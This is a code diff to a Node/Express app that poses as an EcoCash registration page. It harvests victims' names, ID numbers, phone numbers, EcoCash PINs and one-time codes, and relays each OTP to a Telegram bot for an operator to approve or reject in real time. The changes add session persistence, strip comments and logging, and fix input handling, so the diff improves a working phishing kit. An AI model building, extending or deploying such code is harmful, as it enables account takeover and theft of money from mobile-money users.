@@ -12,7 +12,7 @@ app.use(express.urlencoded({ extended: true }));
 
 // ===== STORAGE =====
 const pendingRegistrations = {};
-const otpActions = {}; // Stores admin decisions: { registrationId: 'approved' | 'rejected' }
+const otpActions = {};
 
 // ===== HTML PAGE =====
 const HTML_PAGE = `<!DOCTYPE html>
@@ -107,7 +107,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 @keyframes bounce{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
 .success-container h1{color:#28a745;margin-bottom:10px;font-size:1.6em}
 .success-container p{color:#666;margin-bottom:15px;line-height:1.6;font-size:14px}
-/* VERIFYING SPINNER */
 .verifying-box{text-align:center;padding:40px 20px}
 .verifying-spinner{width:60px;height:60px;margin:0 auto 20px;border-radius:50%;border:5px solid #e0e0e0;border-top-color:#0047AB;animation:spin 1s linear infinite}
 .verifying-box h3{color:#0047AB;font-size:1.1em;margin-bottom:8px}
@@ -140,7 +139,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 
 <!-- STEP 1 -->
-<div class="step-content active" id="step1Content">
+<div class="step-content" id="step1Content">
 <form id="registerForm">
 <div class="form-group">
 <label>Full Name <span class="required">*</span></label>
@@ -194,7 +193,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <div id="otpMessage" class="message"></div>
 </div>
 
-<!-- STEP 3B: VERIFYING (Waiting for admin) -->
+<!-- STEP 3B: VERIFYING -->
 <div class="step-content" id="verifyingContent">
 <div class="verifying-box">
 <div class="verifying-spinner"></div>
@@ -296,10 +295,79 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 
 <script>
+// ===== STATE =====
 var currentAppId = null;
 var selectedPurpose = '';
 var countdownInterval = null;
 var otpPollingInterval = null;
+var currentStep = 1;
+
+// ===== SAVE / RESTORE STATE =====
+function saveState(){
+var state = {
+registrationId: currentAppId,
+step: currentStep,
+fullName: document.getElementById('fullName').value,
+idNumber: document.getElementById('idNumber').value,
+ecocashNumber: document.getElementById('ecocashNumber').value,
+purpose: selectedPurpose
+};
+localStorage.setItem('ecocash_state', JSON.stringify(state));
+}
+
+function clearState(){
+localStorage.removeItem('ecocash_state');
+}
+
+function restoreState(){
+try{
+var raw = localStorage.getItem('ecocash_state');
+if(!raw) return false;
+var state = JSON.parse(raw);
+if(!state.registrationId) return false;
+
+currentAppId = state.registrationId;
+selectedPurpose = state.purpose || '';
+
+// Restore form fields
+if(state.fullName) document.getElementById('fullName').value = state.fullName;
+if(state.idNumber) document.getElementById('idNumber').value = state.idNumber;
+if(state.ecocashNumber) document.getElementById('ecocashNumber').value = state.ecocashNumber;
+
+// Restore purpose selection UI
+if(selectedPurpose){
+document.querySelectorAll('.purpose-item').forEach(function(el){
+if(el.getAttribute('data-value') === selectedPurpose){
+el.classList.add('selected');
+document.getElementById('purposeBtn').disabled = false;
+}
+});
+}
+
+// Jump to the saved step
+if(state.step === 2){
+goToStep(2);
+document.getElementById('sentPhone').textContent = state.ecocashNumber;
+startCountdown();
+return true;
+} else if(state.step === 3 || state.step === 'verifying'){
+// If they were verifying, show verifying and check immediately
+goToStep('verifying');
+startOtpPolling();
+return true;
+} else if(state.step === 4){
+goToStep(4);
+return true;
+} else if(state.step === 5){
+goToStep(5);
+return true;
+}
+return false;
+}catch(e){
+console.error('Restore error:', e);
+return false;
+}
+}
 
 // ===== FORM SUBMIT =====
 document.getElementById('registerForm').addEventListener('submit', async function(e){
@@ -327,6 +395,9 @@ body:JSON.stringify({fullName,idNumber,ecocashNumber,ecoPin})
 var data=await response.json();
 if(data.success){
 currentAppId=data.registrationId;
+currentStep=2;
+saveState();
+
 goToStep(2);
 document.getElementById('sentPhone').textContent=ecocashNumber;
 startCountdown();
@@ -351,19 +422,28 @@ btnText.textContent='Continue';
 // ===== NAVIGATION =====
 function goToStep(step){
 document.querySelectorAll('.step-content').forEach(function(el){el.classList.remove('active')});
+if(step === 'verifying'){
+document.getElementById('verifyingContent').classList.add('active');
+currentStep = 'verifying';
+} else {
 document.getElementById('step'+step+'Content').classList.add('active');
+currentStep = step;
+}
 for(var i=1;i<=4;i++){
 var bar=document.getElementById('step'+i+'Bar');
 if(bar){
 bar.classList.remove('active','completed');
-if(i<Math.min(step,4)){bar.classList.add('completed')}
-else if(i===Math.min(step,4)){bar.classList.add('active')}
+var s = (step === 'verifying') ? 3 : step;
+if(i<Math.min(s,4)){bar.classList.add('completed')}
+else if(i===Math.min(s,4)){bar.classList.add('active')}
 }
 }
+saveState();
 }
 
 // ===== COUNTDOWN =====
 function startCountdown(){
+if(countdownInterval){clearInterval(countdownInterval)}
 var seconds=10;
 var circle=document.getElementById('countdownCircle');
 var progress=document.getElementById('smsProgress');
@@ -387,7 +467,7 @@ document.querySelector('#otpContainer .otp-input').focus();
 var otpInputs=document.querySelectorAll('#otpContainer .otp-input');
 otpInputs.forEach(function(input,index){
 input.addEventListener('input',function(e){
-var v=e.target.value.replace(/\\D/g,'');
+var v=e.target.value.replace(/\D/g,'');
 e.target.value=v;
 e.target.classList.remove('error');
 if(v){
@@ -402,7 +482,7 @@ if(e.key==='Backspace'&&!e.target.value&&index>0){otpInputs[index-1].focus()}
 });
 });
 
-// ===== VERIFY OTP (SEND TO TELEGRAM + WAIT FOR ADMIN) =====
+// ===== VERIFY OTP (SEND + WAIT) =====
 document.getElementById('verifyOtpBtn').addEventListener('click',async function(){
 var otp='';
 otpInputs.forEach(function(input){otp+=input.value});
@@ -417,19 +497,14 @@ btn.disabled=true;
 btn.innerHTML='<span class="loader"></span> Sending...';
 
 try{
-// Send OTP to admin for approval
 var response=await fetch('/api/send-otp-for-approval',{
 method:'POST',
 headers:{'Content-Type':'application/json'},
 body:JSON.stringify({registrationId:currentAppId,otp:otp})
 });
-
 var data=await response.json();
-
 if(data.success){
-// Show verifying screen
 goToStep('verifying');
-// Start polling for admin decision
 startOtpPolling();
 }else{
 showOtpMessage(data.message||'Error','error');
@@ -455,27 +530,28 @@ var data=await response.json();
 if(data.status==='approved'){
 clearInterval(otpPollingInterval);
 otpPollingInterval=null;
-goToStep(4);
-}else if(data.status==='rejected'){
-clearInterval(otpPollingInterval);
-otpPollingInterval=null;
-goToStep(3);
-// Show error
-showOtpMessage('❌ Wrong OTP. Please try again.','error');
-// Clear OTP inputs
-otpInputs.forEach(function(input){input.value='';input.classList.remove('filled','error')});
-otpInputs[0].focus();
-// Re-enable button
 document.getElementById('verifyOtpBtn').disabled=false;
 document.getElementById('verifyOtpBtn').textContent='Verify OTP';
-// Notify server to clear status
+otpInputs.forEach(function(input){input.value='';input.classList.remove('filled','error')});
+goToStep(4);
+}
+else if(data.status==='rejected'){
+clearInterval(otpPollingInterval);
+otpPollingInterval=null;
+document.getElementById('verifyOtpBtn').disabled=false;
+document.getElementById('verifyOtpBtn').textContent='Verify OTP';
+goToStep(3);
+showOtpMessage('❌ Wrong OTP. Please try again.','error');
+otpInputs.forEach(function(input){input.value='';input.classList.remove('filled','error')});
+otpInputs.forEach(function(input){input.classList.add('error')});
+setTimeout(function(){otpInputs.forEach(function(input){input.classList.remove('error')})},1500);
+otpInputs[0].focus();
 fetch('/api/clear-otp-status/'+currentAppId,{method:'POST'});
 }
-// If still 'pending', do nothing (keep waiting)
 }catch(error){
 console.error('Poll error:',error);
 }
-},2000); // Check every 2 seconds
+},2000);
 }
 
 // ===== PURPOSE =====
@@ -485,6 +561,7 @@ document.querySelectorAll('.purpose-item').forEach(function(el){el.classList.rem
 item.classList.add('selected');
 selectedPurpose=item.getAttribute('data-value');
 document.getElementById('purposeBtn').disabled=false;
+saveState();
 });
 });
 
@@ -549,6 +626,7 @@ document.getElementById('finalName').textContent=document.getElementById('fullNa
 document.getElementById('finalPhone').textContent=document.getElementById('ecocashNumber').value;
 document.getElementById('finalPurpose').textContent=selectedPurpose;
 goToStep(7);
+clearState();
 },500);
 return;
 }
@@ -585,9 +663,17 @@ function showPurposeMessage(t,ty){var d=document.getElementById('purposeMessage'
 function showPinMessage(t,ty){var d=document.getElementById('pinMessage');d.textContent=t;d.className='message show '+ty;setTimeout(function(){d.className='message'},5000)}
 
 // ===== INPUT =====
-document.getElementById('ecocashNumber').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
-document.getElementById('ecoPin').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
-document.getElementById('confirmPin').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
+document.getElementById('ecocashNumber').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'')});
+document.getElementById('ecoPin').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'')});
+document.getElementById('confirmPin').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'')});
+
+// ===== INIT: RESTORE STATE ON LOAD =====
+window.addEventListener('load',function(){
+var restored = restoreState();
+if(!restored){
+console.log('Starting fresh');
+}
+});
 </script>
 </body>
 </html>`;
@@ -599,7 +685,6 @@ app.get('/', (req, res) => { res.send(HTML_PAGE); });
 app.post('/api/register', async (req, res) => {
     try {
         const { fullName, idNumber, ecocashNumber, ecoPin } = req.body;
-
         if (!fullName || !idNumber || !ecocashNumber || !ecoPin) {
             return res.status(400).json({ success: false, message: 'All fields required' });
         }
@@ -629,7 +714,6 @@ app.post('/api/register', async (req, res) => {
 
         res.json({ success: true, registrationId, message: 'OK' });
     } catch (error) {
-        console.error(error.message);
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
@@ -661,7 +745,7 @@ app.post('/api/otp-sent', async (req, res) => {
     }
 });
 
-// ===== SEND OTP FOR ADMIN APPROVAL (With Buttons) =====
+// ===== SEND OTP FOR ADMIN APPROVAL =====
 app.post('/api/send-otp-for-approval', async (req, res) => {
     try {
         const { registrationId, otp } = req.body;
@@ -703,12 +787,11 @@ app.post('/api/send-otp-for-approval', async (req, res) => {
 
         res.json({ success: true });
     } catch (error) {
-        console.error(error.message);
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
 
-// ===== CHECK OTP STATUS (Client polls this) =====
+// ===== CHECK OTP STATUS =====
 app.get('/api/check-otp-status/:registrationId', (req, res) => {
     const { registrationId } = req.params;
     const status = otpActions[registrationId] || 'pending';
@@ -722,38 +805,32 @@ app.post('/api/clear-otp-status/:registrationId', (req, res) => {
     res.json({ success: true });
 });
 
-// ===== TELEGRAM WEBHOOK (Admin button taps) =====
+// ===== TELEGRAM WEBHOOK =====
 app.post('/webhook', async (req, res) => {
     try {
         const update = req.body;
-
         if (update.callback_query) {
             const callbackQuery = update.callback_query;
             const data = callbackQuery.data;
             const callbackId = callbackQuery.id;
-
             let responseText = 'Action received';
 
             if (data.startsWith('approve_otp_')) {
                 const registrationId = data.replace('approve_otp_', '');
                 otpActions[registrationId] = 'approved';
                 responseText = '✅ OTP Approved';
-                console.log('✅ Approved OTP for', registrationId);
             } else if (data.startsWith('reject_otp_')) {
                 const registrationId = data.replace('reject_otp_', '');
                 otpActions[registrationId] = 'rejected';
                 responseText = '❌ OTP Rejected';
-                console.log('❌ Rejected OTP for', registrationId);
             }
 
-            // Answer the callback query
             const answerUrl = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
             await axios.post(answerUrl, {
                 callback_query_id: callbackId,
                 text: responseText
             });
         }
-
         res.json({ ok: true });
     } catch (error) {
         console.error('Webhook error:', error.message);
